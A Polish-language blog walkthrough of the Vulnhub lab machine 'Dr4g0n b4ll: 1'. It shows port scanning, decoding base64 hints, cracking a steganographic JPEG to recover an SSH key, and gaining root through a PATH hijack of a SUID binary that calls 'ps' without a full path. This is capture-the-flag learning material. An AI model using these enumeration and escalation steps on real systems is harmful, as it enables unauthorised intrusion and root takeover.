---
title: "Dr4g0n b4ll: 1"
excerpt: " "
comments: true
categories:
  - Hacking
tags:
  - Hacking
  - Vulnhub
header:
  overlay_image: /assets/images/pasek-hack.png
gallery1_2:
  - url: /assets/images/hacking/2021/07/01.jpg
    image_path: /assets/images/hacking/2021/07/01.jpg
  - url: /assets/images/hacking/2021/07/02.jpg
    image_path: /assets/images/hacking/2021/07/02.jpg
gallery3:
  - url: /assets/images/hacking/2021/07/03.png
    image_path: /assets/images/hacking/2021/07/03.png
gallery4:    
  - url: /assets/images/hacking/2021/07/04.png
    image_path: /assets/images/hacking/2021/07/04.png
gallery5:
  - url: /assets/images/hacking/2021/07/05.png
    image_path: /assets/images/hacking/2021/07/05.png
gallery6:
  - url: /assets/images/hacking/2021/07/06.png
    image_path: /assets/images/hacking/2021/07/06.png
---
# Wstƒôp
Wydany na poczƒÖtku stycznia 2021 [Dr4g0n b4ll: 1](https://www.vulnhub.com/entry/dr4g0n-b4ll-1,646/), jak to autorzy wspominajƒÖ jest bardzo prostƒÖ maszynƒÖ, jednak w maju utknƒÖ≈Çem na niej w po≈Çowie, poniewa≈º wcze≈õniej nie mia≈Çem do czynienia ze stenografiƒÖ. Jedna po zaliczeniu paru podatnych obraz√≥w, trochƒô wiedzy przyby≈Ço i spr√≥bowa≈Çem jeszcze raz. Jak zwykle, ≈ºeby wszystko dzia≈Ça≈Ço pod XCP-NG trzeba zmodyfikowaƒá [Grub-a](https://kerszl.github.io/hacking/xcp-ng-i-vulnhub/). Co do poziomu, to prostota prostocie nier√≥wna, ostatnio te≈º bawi≈Çem siƒô maszynƒÖ [Hack Me Please: 1](https://www.vulnhub.com/entry/hack-me-please-1,731/), ale ona ju≈º dla mnie taka prosta nie by≈Ça, jak pisa≈Ç autor. Przypomina≈Ça bardziej prawdziwƒÖ sytuacjƒô, ni≈º takƒÖ upstrzonƒÖ zagadkami. W hack-me-please niestety posi≈Çkowa≈Çem siƒô [solucjƒÖ](https://nepcodex.com/2021/08/hack-me-please-walkthrough-vulnhub/) na necie. Inny typ zadania, ale zawsze jest jakie≈õ nowe do≈õwiadczenie. WracajƒÖc do Dragon Ball-a, to jest ciekawy trik na ko≈Ñcu, kt√≥ry nieraz siƒô wam mo≈ºe przydaƒá, ale to na ko≈Ñcu üòÉ
{: .text-justify}
## Zaczynamy
Jak zwykle skanujemy porty Nmap-em. Mo≈ºemy pod Metasploitem, albo bez. Ja wolƒô u≈ºyƒá Metasploita, bo mam potem wszystkie ip, has≈Ça, otwarte porty w jednym miejscu. Co do shella, to niekoniecznie, czasami wolƒô siƒô wbiƒá normalnie przez ssh, ni≈º potem ulepszaƒá Meterpreter, ale co kto woli.
{: .text-justify}
```bash
msf6 exploit(multi/handler) > db_nmap -A -p- 172.16.1.113
...
msf6 exploit(multi/handler) > services
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
172.16.1.113  22    tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0
172.16.1.113  80    tcp    http  open   Apache httpd 2.4.38 (Debian)
```
Otwarte sƒÖ tylko 2 porty: 22 i 80. Na Stronie www mamy zdjƒôcia z anime Dragon Ball.
## Analizujemy stronƒô
{% include gallery id="gallery1_2"  %}
To tylko ozdoba. Prawdziwa przygoda zaczyna siƒô w kodzie strony. Na samym dole jest zakodowany napis:
{: .text-justify}
{% include gallery id="gallery3"  %}
Po trzykrotnym rozkodowaniu mamy napis **DRAGON BALL**:
```bash
echo -n VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 | base64 -d
echo -n UkZKQlIwOU9JRUpCVEV3PQ== | base64 -d
echo -n RFJBR09OIEJBTEw= | base64 -d
DRAGON BALL
```
Jednak do kodowania napis√≥w w **BASE64** radzƒô pisaƒá **echo -n**. Komenda **echo NAPIS | base64** zakoduje string i dodatkowo znak nowej linii **0x0a**.
{: .text-justify}
{: .notice--info}
Skanowanie Gobusterem:
```bash
gobuster dir -u http://172.16.1.124 -w /usr/share/wordlists/dirb/common.txt
```
I mamy ciekawƒÖ rzecz w robots.txt:

http://172.16.1.124/robots.txt
{: .notice--info}
Ponownie rozkodowujemy:
```bash
echo -n eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI=  | base64 -d
echo -n ZVc5MUlHWnBibVFnZEdobElHaHBaR1JsYmlCa2FYST0K  | base64 -d
echo -n eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI=  | base64 -d
you find the hidden dir 
```
Dostajemy komunikat, ≈ºeby szukaƒá ukryty katalog. Jest tutaj:
{: .text-justify}

http://172.16.1.113/DRAGON%20BALL/Vulnhub/
{: .text-justify}
{: .notice--info}
Poni≈ºej zawarto≈õƒá:
{: .text-justify}
{% include gallery id="gallery4"  %}

Mo≈ºemy wej≈õƒá na stronƒô, ale nic na niej nie zdzia≈Çamy, taka podpucha:
{: .text-justify}

http://172.16.1.113/DRAGON%20BALL/Vulnhub/login.html
{: .notice--info}
{% include gallery id="gallery6"  %}
Strona nie dzia≈Ça poprawnie, ale mamy login i jest ciekawy obrazek **aj.jpg**:
{: .text-justify}
## Czas przyjrzeƒá siƒô obrazowi
{% include gallery id="gallery5"  %}
Rozkodujmy go:
{: .text-justify}
```bash
root@kali:/home/szikers/dr4g0n_b4ll# stegcracker aj.jpg
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2021 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which
will blast through the rockyou.txt wordlist within 1.9 second as opposed
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'aj.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: love
Tried 451 passwords
Your file has been written to: aj.jpg.out
love
```
PodglƒÖdamy co to za plik:
{: .text-justify}
```console
root@kali:/home/szikers/dr4g0n_b4ll# file aj.jpg.out
aj.jpg.out: OpenSSH private key
```
Mamy klucz, wiƒôc mo≈ºemy siƒô dostaƒá do shella, spr√≥bujmy z loginem **xmen**:
{: .text-justify}
```bash
ssh -i id_rsa xmen@172.16.1.113
```
## LƒÖdujemy w Shellu
Dzia≈Ça.Mamy katalog **script**, ale poszukajmy plik√≥w, kt√≥re majƒÖ ustawiony bit **suid**. Mo≈ºe siƒô znajdzie co≈õ interesujƒÖcego:
{: .text-justify}
```console
xmen@debian:~/script$ find / -perm -4000 2> /dev/null
/home/xmen/script/shell
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
```
Godna uwagi jest zawarto≈õƒá w: **/home/xmen/script/shell**
```console
xmen@debian:~$ ls script/ -lah
total 32K
drwxr-xr-x 2 root root 4.0K Jan  4  2021 .
drwxr-xr-x 5 xmen xmen 4.0K Aug  9 07:17 ..
-rw-r--r-- 1 root root   75 Jan  4  2021 demo.c
-rwsr-xr-x 1 root root  17K Jan  4  2021 shell
```
W **demo.c** widaƒá kr√≥tki kod ≈∫r√≥d≈Çowy. Program przechodzi na uprawnienia root-a i uruchamia program **ps**:
{: .text-justify}
```c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("ps");
}
```
Czyli dzia≈Ça to tak:
{: .text-justify}
```console
xmen@debian:~/script$ ./shell
   PID TTY          TIME CMD
  5013 pts/0    00:00:00 shell
  5014 pts/0    00:00:00 sh
  5015 pts/0    00:00:00 ps
xmen@debian:~/script$
```
W kodzie programu nie mamy podanej ca≈Çej ≈õcie≈ºki do **ps**, wiƒôc mo≈ºemy to wykorzystaƒá. Stw√≥rzmy program **ps** w katalogu domowym:
{: .text-justify}
```bash 
file=/home/xmen/ps; touch $file && echo '/bin/bash' > $file && chmod +x $file
```
A nastƒôpnie wyedytujmy zmiennƒÖ **PATH**, ≈ºeby na poczƒÖtku szuka≈Ça **ps** w naszym katalogu domowym:
{: .text-justify}
```bash
PATH="/home/xmen:$(echo $PATH)"
```
```console
xmen@debian:~/script$ echo $PATH
/home/xmen:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
xmen@debian:~/script$ ./shell
root@debian:~/script# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(xmen)
root@debian:~/script#
```
## To ju≈º koniec na dzi≈õ
I to w≈Ça≈õnie jest przestroga, ≈ºeby bardzo uwa≈ºnie pisaƒá pliki, je≈ºeli chcemy daƒá uprawnieniami **suid**. **Ps** przecie≈º jest niegro≈∫ny, ale mo≈ºna zakombinowaƒá i zrobiƒá, ≈ºeby by≈Ç niebezpieczny.
{: .text-justify}
{: .notice--danger}


